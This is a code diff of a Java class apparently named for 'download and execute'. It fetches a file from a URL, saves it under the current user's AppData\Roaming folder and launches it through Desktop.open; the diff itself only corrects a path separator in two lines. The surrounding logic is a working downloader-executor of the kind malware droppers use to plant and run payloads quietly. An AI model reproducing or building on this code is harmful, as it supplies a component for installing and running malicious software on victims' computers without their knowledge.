@@ -22,7 +22,7 @@ public class DandE
         try
         {
             in = new BufferedInputStream(new URL(link).openStream());
-            fout = new FileOutputStream("C://Users//" + System.getProperty("user.name") + "/AppData//Roaming//" + filename);
+            fout = new FileOutputStream("C://Users//" + System.getProperty("user.name") + "//AppData//Roaming//" + filename);
             final byte data[] = new byte[1024];
             int count;
             while ((count = in.read(data, 0, 1024)) != -1)
@@ -47,7 +47,7 @@ public class DandE
 
     public static void Execute() throws Exception
     {
-        File f = new File("C://Users//" + System.getProperty("user.name") + "/AppData//Roaming//" + filename);
+        File f = new File("C://Users//" + System.getProperty("user.name") + "//AppData//Roaming//" + filename);
         Desktop.getDesktop().open(f);
     }
 }
